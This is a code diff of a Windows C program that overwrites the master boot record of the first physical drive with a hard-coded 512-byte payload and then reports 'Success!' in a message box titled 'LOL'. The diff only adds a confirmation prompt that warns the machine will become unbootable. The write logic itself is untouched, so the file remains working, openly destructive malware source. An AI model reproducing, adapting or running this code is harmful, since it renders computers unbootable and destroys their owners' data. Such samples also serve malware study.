@@ -35,10 +35,12 @@ const unsigned char MBR_Data[512] = { 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 
 									  };
 
 INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE PrevInstance, _In_ PWSTR szCmdLine, _In_ INT nShowCmd) {
-	DWORD BytesWritten;
-	HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-	WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
-	CloseHandle(hMBR);
+	if (MessageBoxW(NULL, L"This program overwrites the MBR and makes the machine unusable. We recommend using something like a virtual machine. Are you sure you want to make the machine unbootable?", L"WARNING", MB_ICONWARNING | MB_YESNO) == IDYES) {
+		DWORD BytesWritten;
+		HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+		WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
+		CloseHandle(hMBR);
 
-	MessageBoxW(NULL, L"Success!", L"LOL", MB_OK | MB_ICONINFORMATION);
+		MessageBoxW(NULL, L"Success!", L"LOL", MB_OK | MB_ICONINFORMATION);
+	}
 }
